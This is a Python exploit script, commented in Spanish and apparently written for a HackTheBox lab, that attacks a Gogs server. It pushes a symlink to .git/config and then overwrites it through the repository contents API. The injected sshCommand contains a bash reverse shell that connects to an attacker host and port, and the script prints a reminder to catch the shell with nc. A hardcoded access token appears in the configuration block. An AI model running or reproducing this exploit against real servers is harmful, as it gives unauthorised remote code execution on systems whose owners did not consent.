import requests
import base64
import os
import subprocess
import shutil
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURACIÓN ---
URL = "http://127.0.0.1:8080"
TOKEN = "be5e185bf2e4f7a44d8d052e088ce5b55f1f8d0d"
USER = "alex"
REPO = "pwn"  # El que creaste manualmente
LHOST = "10.10.14.203"
LPORT = "4446"

def pwn():
    repo_dir = f"/tmp/{REPO}"
    # Usamos el Token para el clonado
    clone_url = f"http://{TOKEN}@127.0.0.1:8080/{USER}/{REPO}.git"
    
    if os.path.exists(repo_dir): shutil.rmtree(repo_dir)

    print(f"[*] Clonando repositorio '{REPO}'...")
    subprocess.run(["git", "clone", clone_url, repo_dir], check=True, capture_output=True)

    # Symlink a .git/config
    os.symlink(".git/config", os.path.join(repo_dir, "malicious_link"))

    print("[*] Subiendo symlink al servidor...")
    subprocess.run(["git", "config", "user.email", "alex@htb.local"], cwd=repo_dir, check=True)
    subprocess.run(["git", "config", "user.name", "alex"], cwd=repo_dir, check=True)
    subprocess.run(["git", "add", "malicious_link"], cwd=repo_dir, check=True)
    subprocess.run(["git", "commit", "-m", "add symlink"], cwd=repo_dir, check=True)
    subprocess.run(["git", "push", "origin", "master"], cwd=repo_dir, check=True, capture_output=True)

    # Paso final: Sobreescribir vía API
    session = requests.Session()
    session.headers.update({"Authorization": f"token {TOKEN}"})
    
    api_url = f"{URL}/api/v1/repos/{USER}/{REPO}/contents/malicious_link"
    sha = session.get(api_url).json().get('sha')

    rev_shell = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' #"
    config_payload = f"[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n\tsshCommand = {rev_shell}\n[remote \"origin\"]\n\turl = git@localhost:alex/pwn.git\n"

    data = {
        "message": "pwned",
        "content": base64.b64encode(config_payload.encode()).decode(),
        "sha": sha
    }

    print("[*] Ejecutando el bypass de symlink via API...")
    r = session.put(api_url, json=data)
    
    if r.status_code in [200, 201]:
        print("[+] ¡Payload entregado! Revisa tu nc -lvnp 4446")
        print("[*] TIP: Si no cae la shell, haz un 'git push' manual desde /tmp/pwn para forzar a Gogs a leer el config.")
    else:
        print(f"[-] Error: {r.status_code} - {r.text}")

if __name__ == "__main__":
    try:
        pwn()
    except Exception as e:
        print(f"[X] Falló: {e}")
